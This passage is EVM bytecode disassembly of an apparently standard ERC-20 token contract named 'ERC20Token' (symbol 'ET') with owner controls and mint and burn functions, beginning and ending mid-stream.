DUP4 ADD DUP6 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x210F PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x2128 DUP2 PUSH3 0x1C9D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x2147 JUMPI PUSH3 0x2146 PUSH3 0x1C98 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x2157 DUP5 DUP3 DUP6 ADD PUSH3 0x2117 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH3 0x2177 PUSH1 0x0 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x2186 PUSH1 0x20 DUP4 ADD DUP5 PUSH3 0x1D34 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH3 0x21A4 PUSH1 0x0 DUP4 ADD DUP8 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x21B3 PUSH1 0x20 DUP4 ADD DUP7 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x21C2 PUSH1 0x40 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x21D1 PUSH1 0x60 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0x2216 DUP3 PUSH3 0x1C60 JUMP JUMPDEST SWAP2 POP PUSH3 0x2223 DUP4 PUSH3 0x1C60 JUMP JUMPDEST SWAP3 POP DUP3 PUSH3 0x2236 JUMPI PUSH3 0x2235 PUSH3 0x21DA JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x224E DUP3 PUSH3 0x1C28 JUMP JUMPDEST SWAP2 POP PUSH3 0x225B DUP4 PUSH3 0x1C28 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0x226B DUP2 PUSH3 0x1C28 JUMP JUMPDEST SWAP2 POP PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP5 EQ PUSH1 0x0 DUP5 SLT AND ISZERO PUSH3 0x22A6 JUMPI PUSH3 0x22A5 PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST DUP3 DUP3 SDIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x22BE JUMPI PUSH3 0x22BD PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x22D2 DUP3 PUSH3 0x1C28 JUMP JUMPDEST SWAP2 POP PUSH3 0x22DF DUP4 PUSH3 0x1C28 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 SLT PUSH1 0x0 DUP5 SLT AND DUP3 DUP3 SGT PUSH1 0x0 DUP6 SLT ISZERO AND OR ISZERO PUSH3 0x2309 JUMPI PUSH3 0x2308 PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH3 0x2326 PUSH1 0x0 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x2335 PUSH1 0x20 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x2349 DUP3 PUSH3 0x1C60 JUMP JUMPDEST SWAP2 POP PUSH3 0x2356 DUP4 PUSH3 0x1C60 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0x2366 DUP2 PUSH3 0x1C60 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x2380 JUMPI PUSH3 0x237F PUSH3 0x1EBC JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH3 0x239E PUSH1 0x0 DUP4 ADD DUP6 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x23AD PUSH1 0x20 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH3 0x23BF DUP2 PUSH3 0x1D45 JUMP JUMPDEST DUP2 EQ PUSH3 0x23CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x23DF DUP2 PUSH3 0x23B4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x23FE JUMPI PUSH3 0x23FD PUSH3 0x1C98 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x240E DUP5 DUP3 DUP6 ADD PUSH3 0x23CE JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0x242E PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x243D PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0x1D34 JUMP JUMPDEST PUSH3 0x244C PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0x246B PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x247A PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0x1C6A JUMP JUMPDEST PUSH3 0x2489 PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0x1C6A JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1EF0 CODESIZE SUB DUP1 PUSH3 0x1EF0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x805 JUMP JUMPDEST CALLER PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xA DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4552433230546F6B656E00000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4554000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP2 PUSH3 0xB5 SWAP2 SWAP1 PUSH3 0xABC JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP2 PUSH3 0xC7 SWAP2 SWAP1 PUSH3 0xABC JUMP JUMPDEST POP POP POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x13F JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x136 SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x150 DUP2 PUSH3 0x1A8 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x178 CALLER PUSH8 0xDE0B6B3A7640000 DUP5 PUSH3 0x16C SWAP2 SWAP1 PUSH3 0xC00 JUMP JUMPDEST PUSH3 0x26E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x19F DUP2 PUSH8 0xDE0B6B3A7640000 DUP5 PUSH3 0x193 SWAP2 SWAP1 PUSH3 0xC00 JUMP JUMPDEST PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP POP PUSH3 0xCF1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x2E3 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x2DA SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x2F7 PUSH1 0x0 DUP4 DUP4 PUSH3 0x32E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH3 0x30E PUSH3 0x55E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH3 0x323 DUP2 DUP6 DUP6 PUSH3 0x566 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x384 JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH3 0x377 SWAP2 SWAP1 PUSH3 0xC4B JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH3 0x45A JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH3 0x413 JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x40A SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0xC97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x4A5 JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH3 0x4F2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH3 0x551 SWAP2 SWAP1 PUSH3 0xCD4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH3 0x57B DUP4 DUP4 DUP4 PUSH1 0x1 PUSH3 0x580 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x5F5 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x5EC SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x66A JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x661 SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH3 0x75A JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH3 0x751 SWAP2 SWAP1 PUSH3 0xCD4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x77A DUP2 PUSH3 0x765 JUMP JUMPDEST DUP2 EQ PUSH3 0x786 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x79A DUP2 PUSH3 0x76F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7CD DUP3 PUSH3 0x7A0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x7DF DUP2 PUSH3 0x7C0 JUMP JUMPDEST DUP2 EQ PUSH3 0x7EB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x7FF DUP2 PUSH3 0x7D4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x81F JUMPI PUSH3 0x81E PUSH3 0x760 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x82F DUP6 DUP3 DUP7 ADD PUSH3 0x789 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH3 0x842 DUP6 DUP3 DUP7 ADD PUSH3 0x7EE JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x8CE JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x8E4 JUMPI PUSH3 0x8E3 PUSH3 0x886 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP2 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x8 DUP4 MUL PUSH3 0x94E PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH3 0x90F JUMP JUMPDEST PUSH3 0x95A DUP7 DUP4 PUSH3 0x90F JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x99D PUSH3 0x997 PUSH3 0x991 DUP5 PUSH3 0x765 JUMP JUMPDEST PUSH3 0x972 JUMP JUMPDEST PUSH3 0x765 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x9B9 DUP4 PUSH3 0x97C JUMP JUMPDEST PUSH3 0x9D1 PUSH3 0x9C8 DUP3 PUSH3 0x9A4 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH3 0x91C JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SWAP1 JUMP JUMPDEST PUSH3 0x9E8 PUSH3 0x9D9 JUMP JUMPDEST PUSH3 0x9F5 DUP2 DUP5 DUP5 PUSH3 0x9AE JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0xA1D JUMPI PUSH3 0xA11 PUSH1 0x0 DUP3 PUSH3 0x9DE JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH3 0x9FB JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0xA6C JUMPI PUSH3 0xA36 DUP2 PUSH3 0x8EA JUMP JUMPDEST PUSH3 0xA41 DUP5 PUSH3 0x8FF JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0xA51 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH3 0xA69 PUSH3 0xA60 DUP6 PUSH3 0x8FF JUMP JUMPDEST DUP4 ADD DUP3 PUSH3 0x9FA JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xA91 PUSH1 0x0 NOT DUP5 PUSH1 0x8 MUL PUSH3 0xA71 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xAAC DUP4 DUP4 PUSH3 0xA7E JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xAC7 DUP3 PUSH3 0x84C JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0xAE3 JUMPI PUSH3 0xAE2 PUSH3 0x857 JUMP JUMPDEST JUMPDEST PUSH3 0xAEF DUP3 SLOAD PUSH3 0x8B5 JUMP JUMPDEST PUSH3 0xAFC DUP3 DUP3 DUP6 PUSH3 0xA21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0xB34 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH3 0xB1F JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH3 0xB2B DUP6 DUP3 PUSH3 0xA9E JUMP JUMPDEST DUP7 SSTORE POP PUSH3 0xB9B JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH3 0xB44 DUP7 PUSH3 0x8EA JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0xB6E JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xB47 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH3 0xB8E JUMPI DUP5 DUP10 ADD MLOAD PUSH3 0xB8A PUSH1 0x1F DUP10 AND DUP3 PUSH3 0xA7E JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH3 0xBAE DUP2 PUSH3 0x7C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xBCB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xBA3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0xC0D DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC1A DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0xC2A DUP2 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0xC44 JUMPI PUSH3 0xC43 PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC58 DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC65 DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0xC80 JUMPI PUSH3 0xC7F PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xC91 DUP2 PUSH3 0x765 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0xCAE PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0xBA3 JUMP JUMPDEST PUSH3 0xCBD PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0xC86 JUMP JUMPDEST PUSH3 0xCCC PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xCEB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x11EF DUP1 PUSH3 0xD01 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x9DC29FAC GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x9DC29FAC EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x220 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x280 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x715018A6 EQ PUSH2 0x1BE JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1C8 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x1E6 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xF2 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x122 JUMPI DUP1 